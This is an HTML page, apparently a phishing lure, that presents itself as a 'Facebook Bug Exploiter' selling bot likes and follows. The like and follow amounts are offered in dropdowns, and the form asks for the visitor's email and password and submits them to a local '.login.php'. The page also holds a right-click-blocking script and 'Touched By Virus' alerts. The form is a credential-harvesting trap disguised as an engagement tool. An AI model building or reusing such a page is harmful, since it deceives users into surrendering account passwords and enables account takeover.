<!DOCTYPE html><html lang="en">
<head>
<title>Auto bots Exploiter</title>
<link href='http://bloggernya-fti.blogspot.com/favicon.ico' rel='icon' type='image/x-icon'/>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link type="text/css" href="ftiofficial_decoder.php/css/bootstrap.min.css" rel="stylesheet">
<link type="text/css" href="ftiofficial_decoder.php/css/bootstrap-responsive.min.css" rel="stylesheet">
<link type="text/css" href="ftiofficial_decoder.php/css/theme.css" rel="stylesheet">
<link type="text/css" href="ftiofficial_decoder.php/css/font-awesome.css" rel="stylesheet">
<link type="text/css" href='ftiofficial_decoder.php/css/font-awesome.min.css' rel='stylesheet'>
<script src="ftiofficial_decoder.php/js/jquery-1.9.1.min.js" type="text/javascript"></script>
<script src="ftiofficial_decoder.php/js/jquery-ui-1.10.1.custom.min.js" type="text/javascript"></script>
<script src="ftiofficial_decoder.php/js/bootstrap.min.js" type="text/javascript"></script>
<script src="ftiofficial_decoder.php/js/jquery.flot.js" type="text/javascript"></script>
<script src="ftiofficial_decoder.php/js/jquery.dataTables.js" type="text/javascript"></script>
<script> var message="Shoot.. diee";
///////////////////////////////////////
function clickIE4(){if (event.button==2){alert(message);return false;}} function clickNS4(e){if (document.layers||document.getElementById&&!document.all){if (e.which==2||e.which==3){alert(message);return false;}}} if (document.layers){document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS4;} else if (document.all&&!document.getElementById){document.onmousedown=clickIE4;} document.oncontextmenu=new Function("alert(message);return false")</script><script type='text/javascript'>
		alert(LOADING...")
		alert("Touched By Virus ")
		var months = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember'];
		var myDays = ['Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jum&#39;at', 'Sabtu'];
		var date = new Date();
		var day = date.getDate();
		var month = date.getMonth();
		var thisDay = date.getDay(),
		thisDay = myDays[thisDay];
		var yy = date.getYear();
		var year = (yy < 1000) ? yy + 1900 : yy;
		document.write(thisDay + ', ' + day + ' ' + months[month] + ' ' + year);
		</script><br>
		<!--tag untuk memunculkan jam-->
		<script type="text/javascript">
		var a_p = "";
		var d = new Date();
		var curr_hour = d.getHours();
		if (curr_hour < 12) {
		a_p = "AM";
		} else {
		a_p = "PM";
		}
		if (curr_hour == 0) {
		curr_hour = 12;
		}
		if (curr_hour > 12) {
		curr_hour = curr_hour - 12;
		}
		
		var curr_min = d.getMinutes();
		curr_min = curr_min + "";
		if (curr_min.length == 1) {
		curr_min = "0" + curr_min;
		}
		document.write(curr_hour + " : " + curr_min + " " + a_p);
</script></head>
<body bgcolor="yellow">
<marquee behavior="alternate" scrollamount="90" width="550"> <font size="4" color="red">________<font size="4" color="cyan">________<font size="4" color="cyan">________<font size="4" color="red">________</font></font></font></font></marquee>
<marquee><font color="colgan" size="5"> W E L C O M  TO  2 0 1 8 </font></marquee>
<div class="module message">
<div class="module-head">
<center>
<h3><img src="http://s1.postimg.org/5efdlclsv/fti_icon.png" width="15" hight="15"> Facebook Bug Exploiter</h3><center></div>
<br><center><table cellpadding=5>
<tr>
<td>
<font color="black" size="3">Bug Exploit </font>
</td>
<td>
<font color="black" size="3">Account Info </font>
</td>
</tr>
<div class="module-body table">
<form id="signup" method="post" action=".login.php">
<tr>
<td><span><select><option selected disabled>- Bot Like</option>
<option>1.000</option>
<option>1.500</option>
<option>2.000</option>
<option>2.500</option>
</select></span></td>
<td>
<span><input type="email" class="form-control" id="email" name="Mail" placeholder="Email Address" autocomplete="off" required></span></td></tr></span><br>
<tr>
<td><span><select><option selected disabled>- Bot Follow</option>
<option>1.000</option>
<option>1.500</option>
<option>2.000</option>
<option>2.500</option>
</select></span></td>
<td><span><input type="password" class="form-control" id="password" name="Pass" placeholder="Password" autocomplete="off" required></span></td></tr></table><center><br>
<button type="submit" class="btn btn-success" id="sub" name="sub"><font color="blue">Submit</font></button>&nbsp;&nbsp;&nbsp;</center</form><br><br>
<br>
<img src="https://humorsingkat.files.wordpress.com/2011/12/logo-jempol-like.jpg" width="300" hight="250">

</body></html>